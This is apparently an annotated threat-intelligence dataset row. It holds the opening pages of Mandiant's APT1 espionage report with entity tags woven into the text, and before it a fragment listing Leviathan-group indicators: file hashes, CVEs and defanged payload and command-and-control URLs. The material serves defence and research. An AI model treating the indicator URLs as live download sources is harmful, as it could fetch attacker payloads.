document.write(res);",Leviathan,Microsoft Publisher;Microsoft Excel;JavaScript;PowerShell;Word;Microsoft Word,shipbuilding;IT,Microsoft;F‑Secure;McAfee;Philippines Department of Justice;APEC;THE Navy;the Navy;Technet;Pastebin,"9/10/2018;August 2017;Sep 19, 2017;since at least 2014;September 2017;November 2014;December 2014;October 17, 2017;September 15 and 19, 2017;Between August 2 and 4;February 2015;From February to October of 2015;January 2015;September 19, 2017;since 2014;2015;earlier in 2014",Orz;Cobalt Strike;NanHaiShu;Meterpreter,United States;Western Europe;South China Sea;US;South China sea,"resume.rtf;Resume.rtf;ARLUAS_FieldLog_2017‑08‑21.doc;2014 Accomplishments Input Template.xls;readme.txt;305f331bfb1e97028f8c92cbcb1dff2741dcddacc76843e65f9b1ec5a66f52bc;hxxp://www.vitaminmain[.]info;6f6ee01e9dc2d8c4c260ef4131fe88dc152e53ee8afd3e66e92d4e1bf5fd2e92;DOJ Staff bonus  January 13, 2015.xls;favicon.ico;Java(TM) Platform
SE Auto Updater.lnk;office 365.lnk;SEDll_Win32.dll;DOJ Staff bonus January 13, 2015.xls;vcmQx3ELgTyTyOVSvsm7wrBKwraFw8VFwCuL;cdf6e2e928a89cbb857e688055a25e37a8d8b8b90530bd52c8548fb544f66f1f;c7fa6f27ec4f4142ae591f2dd7c63d046431945f03c87dbed88d79f55180a46d;ftp://185.106.120[.]206/pub/readme.txt;hxxp://185.106.120[.]206/favicon.ico;39c952c7e14b6be5a9cb1be3f05eafa22e1115806e927f4e2dc85d609bc0eb36;Favicon.ico;5860ddc428ffa900258207e9c385f843a3472f2fbf252d2f6357d458646cf362;ced7ca9625543d3d3d09f70223cc19f0d99e21792854452df5ba84b3a59d17b8;20170720_final_pm_app‑2.doc;bfc5c6817ff2cc4f3cd40f649e10cc9ae1e52139f35fdddbd32cb4d221368922;80b931ab1798d7d8a8d63411861cee07e31bb9a68f595f579e11d3817cfc4aca;146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4;green.ddd;4029b43c7febd05e8bf013c1022244aaa238341ca44bbce2250667614c1a4932",,,regsvr32;WMI,Squiblydoo,,,,,CVE‑2017‑0199;CVE‑2017‑8759,13,14,2,9,43,21,9,38,0,0,5,2,0,0,0,0,10
Mandiant_APT1_Report,"<THREAT_ACTOR>APT1</THREAT_ACTOR>
Exposing One of <COUNTRY>China</COUNTRY>’s Cyber 
Espionage Units



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR>  www.mandiant.com

Contents

Executive Summary .......................................................................................................... 2

<COUNTRY>China</COUNTRY>’s Computer Network Operations Tasking to <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> (61398部队) .................... 7

<THREAT_ACTOR>APT1</THREAT_ACTOR>: Years of Espionage  ............................................................................................... 20

<THREAT_ACTOR>APT1</THREAT_ACTOR>: Attack Lifecycle .................................................................................................... 27

<THREAT_ACTOR>APT1</THREAT_ACTOR>: Infrastructure ....................................................................................................... 39

<THREAT_ACTOR>APT1</THREAT_ACTOR>: Identities ............................................................................................................. 51

Conclusion ..................................................................................................................... 59

Appendix A: How Does <ORG>Mandiant</ORG> Distinguish Threat Groups? .............................................. 61

Appendix B: <THREAT_ACTOR>APT</THREAT_ACTOR> and the Attack Lifecycle......................................................................... 63

Appendix C (Digital): The Malware Arsenal ........................................................................ 66

Appendix D (Digital): FQDNs ............................................................................................ 67

Appendix E (Digital): MD5 Hashes ................................................................................... 68

Appendix F (Digital): SSL Certificates ............................................................................... 69

Appendix G (Digital): IOCs ............................................................................................... 70

Appendix H (Digital): Video .............................................................................................. 74



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 1 www.mandiant.com

“<COUNTRY>China</COUNTRY>’s economic espionage has reached an intolerable level and I believe that the <COUNTRY>United States</COUNTRY> and our allies in <COUNTRY>Europe</COUNTRY> and 
<COUNTRY>Asia</COUNTRY> have an obligation to confront <CITY>Beijing</CITY> and demand that they 
put a stop to this piracy. 

<CITY>Beijing</CITY> is waging a massive trade war on us all, and we should 
band together to pressure them to stop. Combined, the <COUNTRY>United States</COUNTRY> and our allies in <COUNTRY>Europe</COUNTRY> and <COUNTRY>Asia</COUNTRY> have significant 
diplomatic and economic leverage over <COUNTRY>China</COUNTRY>, and we should 
use this to our advantage to put an end to this scourge.”1

— <COUNTRY>U.S.</COUNTRY> Rep. <IDENTITY>Mike Rogers</IDENTITY>, <TIMESTAMP>October, 2011</TIMESTAMP>

“ It is unprofessional and groundless to accuse the <ORG>Chinese military</ORG> of launching cyber attacks 
without any conclusive evidence.”2

— <ORG>Chinese Defense Ministry</ORG>, <TIMESTAMP>January, 2013</TIMESTAMP>

1 “<IDENTITY>Mike Rogers</IDENTITY>, Statement to the <COUNTRY>U.S.</COUNTRY> House, Permanent Select Committee on Intelligence, Open Hearing: Cyber Threats and Ongoing Efforts to 
Protect the Nation, Hearing, <TIMESTAMP>October 4, 2011</TIMESTAMP>, http://intelligence.house.gov/sites/intelligence.house.gov/files/documents/100411CyberHearingRogers.
pdf, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
2 “Chinese hackers suspected in attack on The Post’s computers.” The <ORG>Washington Post</ORG>, <TIMESTAMP>Feb. 1, 2013</TIMESTAMP>, http://www.washingtonpost.com/business/
technology/chinese-hackers-suspected-in-attack-on-the-posts-computers/2013/02/01/d5a44fde-6cb1-11e2-bd36-c0fe61a205f6_story.html, 
accessed <TIMESTAMP>Feb. 1, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 2 www.mandiant.com

exeCutIve suMMary

<TIMESTAMP>Since 2004</TIMESTAMP>, <ORG>Mandiant</ORG> has investigated computer security breaches at hundreds of organizations around the world. 
The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent 
Threat” (<THREAT_ACTOR>APT</THREAT_ACTOR>). We first published details about the <THREAT_ACTOR>APT</THREAT_ACTOR> in our <TIMESTAMP>January 2010</TIMESTAMP> <ORG>M-Trends</ORG> report. As we stated in the 
report, our position was that “The <ORG>Chinese government</ORG> may authorize this activity, but there’s no way to determine the 
extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details 
we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based 
primarily in <COUNTRY>China</COUNTRY> and that the <ORG>Chinese Government</ORG> is aware of them.3 

<ORG>Mandiant</ORG> continues to track dozens of <THREAT_ACTOR>APT</THREAT_ACTOR> groups around the world; however, this report is focused on the most 
prolific of these groups. We refer to this group as “<THREAT_ACTOR>APT1</THREAT_ACTOR>” and it is one of more than 20 <THREAT_ACTOR>APT</THREAT_ACTOR> groups with origins in 
<COUNTRY>China</COUNTRY>. <THREAT_ACTOR>APT1</THREAT_ACTOR> is a single organization of operators that has conducted a cyber espionage campaign against a broad 
range of victims <TIMESTAMP>since at least 2006</TIMESTAMP>. From our observations, it is one of the most prolific cyber espionage groups in 
terms of the sheer quantity of information stolen. The scale and impact of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s operations compelled us to write this 
report.

The activity we have directly observed likely represents only a small fraction of the cyber espionage that <THREAT_ACTOR>APT1</THREAT_ACTOR> has 
conducted. Though our visibility of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s activities is incomplete, we have analyzed the group’s intrusions against 
nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked <THREAT_ACTOR>APT1</THREAT_ACTOR> back 
to four large networks in <CITY>Shanghai</CITY>, two of which are allocated directly to the Pudong New Area. We uncovered a 
substantial amount of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s attack infrastructure, command and control, and modus operandi (tools, tactics, and 
procedures). In an effort to underscore there are actual individuals behind the keyboard, <ORG>Mandiant</ORG> is revealing three 
personas we have attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR>. These operators, like soldiers, may merely be following orders given to them by 
others.

Our analysis has led us to conclude that <THREAT_ACTOR>APT1</THREAT_ACTOR> is likely government-sponsored and one of the most persistent of <COUNTRY>China</COUNTRY>’s 
cyber threat actors. We believe that <THREAT_ACTOR>APT1</THREAT_ACTOR> is able to wage such a long-running and extensive cyber espionage campaign 
in large part because it receives direct government support. In seeking to identify the organization behind this activity, 
our research found that <ORG>People’s Liberation Army</ORG> (<ORG>PLA</ORG>’s) <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is similar to <THREAT_ACTOR>APT1</THREAT_ACTOR> in its mission, capabilities, and 
resources. <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> is also located in precisely the same area from which <THREAT_ACTOR>APT1</THREAT_ACTOR> activity appears to originate.

3 Our conclusions are based exclusively on unclassified, open source information derived from <ORG>Mandiant</ORG> observations. None of the information in 
this report involves access to or confirmation by classified intelligence.

https://www.mandiant.com/resources/m-trends/


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 3 www.mandiant.com

KEY FINDINGS

<THREAT_ACTOR>APT1</THREAT_ACTOR> is believed to be the 2nd Bureau of the <ORG>People’s Liberation army</ORG> (<ORG>PLA</ORG>) <ORG>General Staff Department</ORG>’s 
(<ORG>GSD</ORG>) 3rd Department (总参三部二局), which is most commonly known by its <ORG>Military unit Cover Designator</ORG> (<ORG>MUCD</ORG>) as <THREAT_ACTOR>unit 61398</THREAT_ACTOR> (61398部队).
»» The nature of “<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s” work is considered by <COUNTRY>China</COUNTRY> to be a state secret; however, we believe it engages in 

harmful “Computer Network Operations.” 

»» <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is partially situated on Datong Road (大同路) in <CITY>Gaoqiaozhen</CITY> (高桥镇), which is located in the Pudong 
New Area (浦东新区) of <CITY>Shanghai</CITY> (上海). The central building in this compound is a 130,663 square foot facility 
that is 12 stories high and was built <TIMESTAMP>in early 2007</TIMESTAMP>.

»» We estimate that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is staffed by hundreds, and perhaps thousands of people based on the size of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s physical infrastructure. 

»» <ORG>China Telecom</ORG> provided special fiber optic communications infrastructure for the unit in the name of national 
defense.

»» <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> requires its personnel to be trained in computer security and computer network operations and also 
requires its personnel to be proficient in the English language. 

»» <ORG>Mandiant</ORG> has traced <THREAT_ACTOR>APT1</THREAT_ACTOR>’s activity to four large networks in <CITY>Shanghai</CITY>, two of which serve the Pudong New Area 
where <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is based.

<THREAT_ACTOR>APT1</THREAT_ACTOR> has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has 
demonstrated the capability and intent to steal from dozens of organizations simultaneously.4

»» <TIMESTAMP>Since 2006</TIMESTAMP>, <ORG>Mandiant</ORG> has observed <THREAT_ACTOR>APT1</THREAT_ACTOR> compromise 141 companies spanning 20 major industries.

»» <THREAT_ACTOR>APT1</THREAT_ACTOR> has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable 
intellectual property.

»» Once <THREAT_ACTOR>APT1</THREAT_ACTOR> has established access, they periodically revisit the victim’s network over several months or years 
and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing 
processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists 
from victim organizations’ leadership. 

»» <THREAT_ACTOR>APT1</THREAT_ACTOR> uses some tools and techniques that we have not yet observed being used by other groups including two 
utilities designed to steal email — <MALWARE>GETMAIL</MALWARE> and <MALWARE>MAPIGET</MALWARE>.

»» <THREAT_ACTOR>APT1</THREAT_ACTOR> maintained access to victim networks for an average of 356 days.5 The longest time period <THREAT_ACTOR>APT1</THREAT_ACTOR> maintained 
access to a victim’s network was 1,764 days, or four years and ten months.

»» Among other large-scale thefts of intellectual property, we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> stealing 6.5 terabytes of 
compressed data from a single organization over a ten-month time period. 

»» <TIMESTAMP>In the first month of 2011</TIMESTAMP>, <THREAT_ACTOR>APT1</THREAT_ACTOR> successfully compromised at least 17 new victims operating in 10 different 
industries.

4  We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that <THREAT_ACTOR>APT1</THREAT_ACTOR> has conducted. 
Therefore, <ORG>Mandiant</ORG> is establishing the lower bounds of <THREAT_ACTOR>APT1</THREAT_ACTOR> activities in this report.
5  This is based on 91 of the 141 victim organizations. In the remaining cases, <THREAT_ACTOR>APT1</THREAT_ACTOR> activity is either ongoing or else we do not have visibility into 
the last known date of <THREAT_ACTOR>APT1</THREAT_ACTOR> activity in the network.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 4 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> focuses on compromising organizations across a broad range of industries in english-speaking 
countries. 
»» Of the 141 <THREAT_ACTOR>APT1</THREAT_ACTOR> victims, 87% of them are headquartered in countries where English is the native language. 

»» The industries <THREAT_ACTOR>APT1</THREAT_ACTOR> targets match industries that <COUNTRY>China</COUNTRY> has identified as strategic to their growth, including four of 
the seven strategic emerging industries that <COUNTRY>China</COUNTRY> identified in its 12th Five Year Plan. 

<THREAT_ACTOR>APT1</THREAT_ACTOR> maintains an extensive infrastructure of computer systems around the world.
»» <THREAT_ACTOR>APT1</THREAT_ACTOR> controls thousands of systems in support of their computer intrusion activities. 

»» In the last two years we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> establish a minimum of 937 Command and Control (C2) servers 
hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were 
registered to organizations in <COUNTRY>China</COUNTRY> (709), followed by the <COUNTRY>U.S.</COUNTRY> (109). 

»» In the last three years we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> use fully qualified domain names (FQDNs) resolving to 988 unique 
IP addresses.

»» <TIMESTAMP>Over a two-year period</TIMESTAMP> (<TIMESTAMP>January 2011 to January 2013</TIMESTAMP>) we confirmed 1,905 instances of <THREAT_ACTOR>APT1</THREAT_ACTOR> actors logging into 
their attack infrastructure from 832 different IP addresses with <SOFTWARE>Remote Desktop</SOFTWARE>, a tool that provides a remote user 
with an interactive graphical interface to a system.

»» In the last several years we have confirmed 2,551 FQDNs attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR>. 

In over 97% of the 1,905 times <ORG>Mandiant</ORG> observed <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders connecting to their attack 
infrastructure, <THREAT_ACTOR>APT1</THREAT_ACTOR> used IP addresses registered in <CITY>Shanghai</CITY> and systems set to use the simplified 
Chinese language.
»» In 1,849 of the 1,905 (97%) of the <SOFTWARE>Remote Desktop</SOFTWARE> sessions <THREAT_ACTOR>APT1</THREAT_ACTOR> conducted under our observation, the <THREAT_ACTOR>APT1</THREAT_ACTOR> 

operator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”. <SOFTWARE>Microsoft’s Remote Desktop</SOFTWARE> client 
configures this setting automatically based on the selected language on the client system. Therefore, the <THREAT_ACTOR>APT1</THREAT_ACTOR> 
attackers likely have their <ORG>Microsoft</ORG>® operating system configured to display Simplified Chinese fonts.

»» 817 of the 832 (98%) IP addresses logging into <THREAT_ACTOR>APT1</THREAT_ACTOR> controlled systems using <SOFTWARE>Remote Desktop</SOFTWARE> resolved back to 
<COUNTRY>China</COUNTRY>.

»» We observed 767 separate instances in which <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders used the “<TOOL>HUC Packet Transmit Tool</TOOL>” or <TOOL>HTRAN</TOOL> 
to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack 
infrastructure. Of the 614 distinct IP addresses used for <TOOL>HTRAN</TOOL> communications: 

»− 614 of 614 (100%) were registered in <COUNTRY>China</COUNTRY>.

»− 613 (99.8%) were registered to one of four <CITY>Shanghai</CITY> net blocks. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 5 www.mandiant.com

the size of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s infrastructure implies a large organization with at least dozens, but potentially 
hundreds of human operators. 
»» We conservatively estimate that <THREAT_ACTOR>APT1</THREAT_ACTOR>’s current attack infrastructure includes over 1,000 servers.

»» Given the volume, duration and type of attack activity we have observed, <THREAT_ACTOR>APT1</THREAT_ACTOR> operators would need to be directly 
supported by linguists, open source researchers, malware authors, industry experts who translate task requests 
from requestors to the operators, and people who then transmit stolen information to the requestors. 

»» <THREAT_ACTOR>APT1</THREAT_ACTOR> would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who 
handle <INDUSTRY>finances</INDUSTRY>, <INDUSTRY>facility management</INDUSTRY>, and <INDUSTRY>logistics</INDUSTRY> (e.g., <INDUSTRY>shipping</INDUSTRY>).

In an effort to underscore that there are actual individuals behind the keyboard, <ORG>Mandiant</ORG> is revealing 
three personas that are associated with <THREAT_ACTOR>APT1</THREAT_ACTOR> activity. 
»» The first persona, “<IDENTITY>UglyGorilla</IDENTITY>”, has been active in computer network operations since <TIMESTAMP>October 2004</TIMESTAMP>. His activities 

include registering domains attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR> and authoring malware used in <THREAT_ACTOR>APT1</THREAT_ACTOR> campaigns. “<IDENTITY>UglyGorilla</IDENTITY>” 
publicly expressed his interest in <COUNTRY>China</COUNTRY>’s “cyber troops” in <TIMESTAMP>January 2004</TIMESTAMP>.

»» The second persona, an actor we call “<IDENTITY>DOTA</IDENTITY>”, has registered dozens of email accounts used to conduct <TECHNIQUE>social engineering</TECHNIQUE> and <TECHNIQUE>spear phishing</TECHNIQUE> attacks in support of <THREAT_ACTOR>APT1</THREAT_ACTOR> campaigns. “<IDENTITY>DOTA</IDENTITY>” used a <CITY>Shanghai</CITY> phone number 
while registering these accounts.

»» We have observed both the “<IDENTITY>UglyGorilla</IDENTITY>” persona and the “<IDENTITY>DOTA</IDENTITY>” persona using the same shared infrastructure, 
including FQDNs and IP ranges that we have attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR>. 

»» The third persona, who uses the nickname “<IDENTITY>SUPERHARD</IDENTITY>,” is the creator or a significant contributor to the <MALWARE>AURIGA</MALWARE> 
and <MALWARE>BANGAT</MALWARE> malware families which we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> and other <THREAT_ACTOR>APT</THREAT_ACTOR> groups use. “<IDENTITY>SUPERHARD</IDENTITY>” discloses 
his location to be the Pudong New Area of <CITY>Shanghai</CITY>.

<ORG>Mandiant</ORG> is releasing more than 3,000 indicators to bolster defenses against <THREAT_ACTOR>APT1</THREAT_ACTOR> operations. 
»» Specifically, <ORG>Mandiant</ORG> is providing the following: 

»− Digital delivery of over 3,000 <THREAT_ACTOR>APT1</THREAT_ACTOR> indicators, such as domain names, IP addresses, and MD5 hashes of 
malware.

»− Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in <THREAT_ACTOR>APT1</THREAT_ACTOR>’s 
arsenal of digital weapons. 

»− Thirteen (13) X.509 encryption certificates used by <THREAT_ACTOR>APT1</THREAT_ACTOR>.

»− A compilation of videos showing actual attacker sessions and their intrusion activities.

»» While existing customers of <ORG>Mandiant</ORG>’s enterprise-level products, <SOFTWARE>Mandiant Managed Defense</SOFTWARE> and <SOFTWARE>Mandiant Intelligent Response</SOFTWARE>®, have had prior access to these <THREAT_ACTOR>APT1</THREAT_ACTOR> Indicators, we are also making them available for use 
with <SOFTWARE>RedLine</SOFTWARE>™, our free host-based investigative tool. <SOFTWARE>RedLine</SOFTWARE> can be downloaded at http://www.mandiant.com/
resources/download/redline.

http://www.mandiant.com/products/mcirt-managed-defense/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/resources/download/redline
http://www.mandiant.com/resources/download/redline


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 6 www.mandiant.com

Conclusion

The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified 
group based in <COUNTRY>China</COUNTRY> leaves little doubt about the organization behind <THREAT_ACTOR>APT1</THREAT_ACTOR>. We believe the totality of the evidence 
we provide in this document bolsters the claim that <THREAT_ACTOR>APT1</THREAT_ACTOR> is <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. However, we admit there is one other unlikely 
possibility:

A secret, resourced organization full of mainland Chinese speakers with direct access to <CITY>Shanghai</CITY>-based 
<INDUSTRY>telecommunications</INDUSTRY> infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s gates, performing tasks similar to <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s known mission.

Why We Are Exposing <THREAT_ACTOR>APT1</THREAT_ACTOR> 

The decision to publish a significant part of our intelligence about <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> was a painstaking one. What started as 
a “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive 
impact resulting from our decision to expose <THREAT_ACTOR>APT1</THREAT_ACTOR> outweighed the risk to our ability to collect intelligence on this 
particular <THREAT_ACTOR>APT</THREAT_ACTOR> group. It is time to acknowledge the threat is originating in <COUNTRY>China</COUNTRY>, and we wanted to do our part to arm 
and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing 
link in publicly understanding the landscape of <THREAT_ACTOR>APT</THREAT_ACTOR> cyber espionage. Without establishing a solid connection to <COUNTRY>China</COUNTRY>, 
there will always be room for observers to dismiss <THREAT_ACTOR>APT</THREAT_ACTOR> actions as uncoordinated, solely criminal in nature, or peripheral 
to larger national security and global economic concerns. We hope that this report will lead to increased understanding 
and coordinated action in countering <THREAT_ACTOR>APT</THREAT_ACTOR> network breaches.

At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and 
technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, 
publishing certain kinds of indicators dramatically shortens their lifespan. When <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> changes their techniques 
after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It 
is our sincere hope, however, that this report can temporarily increase the costs of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s operations and impede 
their progress in a meaningful way.

We are acutely aware of the risk this report poses for us. We expect reprisals from <COUNTRY>China</COUNTRY> as well as an onslaught of 
criticism. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 7 www.mandiant.com

<COUNTRY>China</COUNTRY>’s CoMPuter network 
oPeratIons taskInG to <THREAT_ACTOR>PLa unIt 61398</THREAT_ACTOR> (61398部队 )

Our research and observations indicate that <ORG>the Communist Party</ORG> of  
<COUNTRY>China</COUNTRY> (<ORG>CPC</ORG>,中国共产党) is tasking the <ORG>Chinese People’s Liberation Army</ORG>  
(<ORG>PLA</ORG>,中国人民解放军) to commit systematic cyber espionage and data theft 
against organizations around the world. This section provides photos and details 
of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> facilities, Chinese references discussing the unit’s training and 
coursework requirements, and internal Chinese communications documenting 
the nature of the unit’s relationship with at least one state-owned enterprise. 
These details will be particularly relevant when we discuss <THREAT_ACTOR>APT1</THREAT_ACTOR>’s expertise, 
personnel, location, and infrastructure, which parallel those of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>.

<ORG>the Communist Party</ORG> of <COUNTRY>China</COUNTRY>

The <ORG>PLA</ORG>’s cyber command is fully institutionalized within the <ORG>CPC</ORG> and able to draw upon the resources of <COUNTRY>China</COUNTRY>’s state-
owned enterprises to support its operations. The <ORG>CPC</ORG> is the ultimate authority in Mainland <COUNTRY>China</COUNTRY>; unlike in Western 
societies, in which political parties are subordinate to the government, the military and government in <COUNTRY>China</COUNTRY> are 
subordinate to the <ORG>CPC</ORG>. In fact, the <ORG>PLA</ORG> reports directly to the <ORG>CPC</ORG>’s <ORG>Central Military Commission</ORG> (CMC, 中央军事委
员会).6 This means that any enterprise cyber espionage campaign within the <ORG>PLA</ORG> is occurring at the direction of senior 
members of the <ORG>CPC</ORG>.

We believe that the <ORG>PLA</ORG>’s strategic cyber command is situated in the <ORG>PLA</ORG>’s <ORG>General Staff Department</ORG> (<ORG>GSD</ORG>,总参谋
部), specifically its 3rd Department (总参三部).7 The <ORG>GSD</ORG> is the most senior <ORG>PLA</ORG> department. Similar to the <COUNTRY>U.S.</COUNTRY> 
<ORG>Joint Chiefs of Staff</ORG>, the <ORG>GSD</ORG> establishes doctrine and provides operational guidance for the <ORG>PLA</ORG>. Within the <ORG>GSD</ORG>, the 
3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information 

6 <IDENTITY>James C. Mulvenon</IDENTITY> and <IDENTITY>Andrew N. D. Yang</IDENTITY>, editors, <ORG>The People’s Liberation Army</ORG> as Organization: Reference Volume v1.0, (<CITY>Santa Monica</CITY>, CA: <ORG>RAND Corporation</ORG>, <TIMESTAMP>2002</TIMESTAMP>), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
7 <IDENTITY>Bryan Krekel</IDENTITY>, <IDENTITY>Patton Adams</IDENTITY>, and <IDENTITY>George Bakos</IDENTITY>, “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the <COUNTRY>U.S.</COUNTRY>-<COUNTRY>China</COUNTRY> Economic and Security Review Commission by <ORG>Northrop Grumman Corp</ORG> (<TIMESTAMP>2012</TIMESTAMP>): 10, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 8 www.mandiant.com

systems.8 It is estimated to have 130,0009 personnel divided between 12 bureaus (局), three research institutes, and 
16 regional and functional bureaus.10 We believe that the <ORG>GSD</ORG> 3rd Department, 2nd Bureau (总参三部二局), is the 
<THREAT_ACTOR>APT group</THREAT_ACTOR> that we are tracking as <THREAT_ACTOR>APT1</THREAT_ACTOR>. Figure 1 shows how close the 2nd Bureau sits to the highest levels of the 
<ORG>CPC</ORG>. At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.

<ORG>Communist Party</ORG> of <COUNTRY>China</COUNTRY>
(<ORG>Central Military Commission</ORG>,

)

<ORG>PLA</ORG> <ORG>General Staff Department</ORG>
( )

<ORG>PLA</ORG> <ORG>General Political Department</ORG>
( )

<ORG>PLA</ORG> <ORG>General Logistics Department</ORG>
( )

<ORG>PLA</ORG> <ORG>General Armaments Department</ORG>
( )

<ORG>GSD</ORG> 1st Department 
( )
Operations

<ORG>GSD</ORG> 2nd Department
( )
Intelligence

<ORG>GSD</ORG> 3rd Department
( )

<ORG>SIGINT</ORG>/<ORG>CNO</ORG>

7 Military Regions
<ORG>PLA Airforce</ORG> (<ORG>PLAA</ORG>)
<ORG>PLA Navy</ORG> (<ORG>PLAN</ORG>)

1st Bureau
(总参三部一局)

2nd Bureau
(总参三部二局)

<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>

12 Total Bureaus
3 Research Institutes

FIGure 1: <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s position within the <ORG>PLa11</ORG> 

8 The 3rd department’s mission is roughly a blend of the missions assigned to the <COUNTRY>U.S.</COUNTRY> <ORG>National Security Agency</ORG>, <ORG>the Defense Language Institute</ORG>, 
and parts of <ORG>the Defense Information Systems Agency</ORG>.
9 <IDENTITY>Bryan Krekel</IDENTITY>, <IDENTITY>Patton Adams</IDENTITY>, and <IDENTITY>George Bakos</IDENTITY>, “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the <COUNTRY>U.S.</COUNTRY>-<COUNTRY>China</COUNTRY> Economic and Security Review Commission by <ORG>Northrop Grumman Corp</ORG> (<TIMESTAMP>2012</TIMESTAMP>): 47, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
10 <IDENTITY>Ian Easton</IDENTITY> and <IDENTITY>Mark A. Stokes</IDENTITY>, “<COUNTRY>China</COUNTRY>’s Electronic Intelligence Satellite Developments: Implications for <COUNTRY>U.S.</COUNTRY> Air and Naval Operations,” <ORG>Project 2049 Institute</ORG> (<TIMESTAMP>2011</TIMESTAMP>): 5, http://project2049.net/documents/<COUNTRY>China</COUNTRY>_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf, accessed 
<TIMESTAMP>February 6, 2013</TIMESTAMP>.
11 <IDENTITY>James C. Mulvenon</IDENTITY> and <IDENTITY>Andrew N. D. Yang</IDENTITY>, editors, The <ORG>People’s Liberation Army</ORG> as Organization: Reference Volume v1.0, (<CITY>Santa Monica</CITY>, CA: 
<ORG>RAND Corporation</ORG>, <TIMESTAMP>2002</TIMESTAMP>), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 9 www.mandiant.com

Inferring the Computer Network 
Operations Mission and Capabilities 
of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> (61398部队) 

Publicly available references confirm that the 
<ORG>PLA</ORG> <ORG>GSD</ORG>’s 3rd Department, 2nd Bureau, is 
<ORG>Military Unit Cover Designator</ORG> (<ORG>MUCD</ORG>) 61398, 
more commonly known as <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>.12 They 
also clearly indicate that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is tasked 
with computer network operations (<ORG>CNO</ORG>).13 
